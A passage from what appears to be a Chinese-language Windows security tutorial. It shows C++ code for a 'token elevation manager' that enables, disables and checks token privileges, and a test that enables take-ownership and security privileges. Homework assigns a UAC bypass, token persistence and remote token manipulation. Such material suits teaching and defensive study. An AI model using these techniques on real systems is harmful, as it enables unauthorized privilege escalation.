+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Attributes </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> SE_PRIVILEGE_ENABLED;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">AdjustTokenPrivileges</span><span style="color:#E1E4E8">(m_hCurrentToken, FALSE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tp, </span></span>
+<span class="line"><span style="color:#F97583">                                     sizeof</span><span style="color:#E1E4E8">(TOKEN_PRIVILEGES), </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> FALSE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 内部禁用特权</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> InternalDisablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">m_hCurrentToken) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        LUID luid;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">LookupPrivilegeValueA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, privilegeName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">luid)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_PRIVILEGES tp;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.PrivilegeCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Luid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> luid;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Attributes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span><span style="color:#6A737D"> // 禁用</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">AdjustTokenPrivileges</span><span style="color:#E1E4E8">(m_hCurrentToken, FALSE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tp, </span></span>
+<span class="line"><span style="color:#F97583">                                     sizeof</span><span style="color:#E1E4E8">(TOKEN_PRIVILEGES), </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> FALSE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 内部检查特权</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> InternalCheckPrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">m_hCurrentToken) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        LUID luid;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">LookupPrivilegeValueA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, privilegeName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">luid)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PRIVILEGE_SET ps;</span></span>
+<span class="line"><span style="color:#E1E4E8">        ps.PrivilegeCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        ps.Control </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        ps.Privilege[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Luid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> luid;</span></span>
+<span class="line"><span style="color:#E1E4E8">        ps.Privilege[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Attributes </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> SE_PRIVILEGE_ENABLED;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BOOL result;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">PrivilegeCheck</span><span style="color:#E1E4E8">(m_hCurrentToken, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">ps, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">result) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> result);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试令牌提权管理器</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestTokenElevationManager</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Token Elevation Manager Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    TokenElevationManager manager;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 显示当前状态</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Current elevation level: "</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    switch</span><span style="color:#E1E4E8"> (manager.</span><span style="color:#B392F0">GetCurrentLevel</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::None: </span><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"None</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::Medium: </span><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Medium</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::High: </span><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"High</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#B392F0"> ElevationLevel</span><span style="color:#E1E4E8">::System: </span><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"System</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取令牌统计信息</span></span>
+<span class="line"><span style="color:#E1E4E8">    manager.</span><span style="color:#B392F0">GetTokenStatistics</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 提升到高级别</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Elevating to high level...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (manager.</span><span style="color:#B392F0">ElevateToLevel</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">ElevationLevel</span><span style="color:#E1E4E8">::High)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Successfully elevated to high level</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 启用额外特权</span></span>
+<span class="line"><span style="color:#E1E4E8">        manager.</span><span style="color:#B392F0">EnablePrivilege</span><span style="color:#E1E4E8">(SE_TAKE_OWNERSHIP_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">        manager.</span><span style="color:#B392F0">EnablePrivilege</span><span style="color:#E1E4E8">(SE_SECURITY_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 列出启用的特权</span></span>
+<span class="line"><span style="color:#E1E4E8">        manager.</span><span style="color:#B392F0">ListEnabledPrivileges</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to elevate</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h2 id="section-12">课后作业</h2><h3 id="section-13">作业1：实现Bypass UAC功能</h3><p>研究并实现用户账户控制(UAC)绕过技术。</p><h3 id="section-14">作业2：添加令牌持久化功能</h3><p>实现令牌的持久化存储和恢复功能。</p><h3 id="section-15">作业3：实现远程令牌操作</h3><p>添加远程进程令牌操作功能。</p>
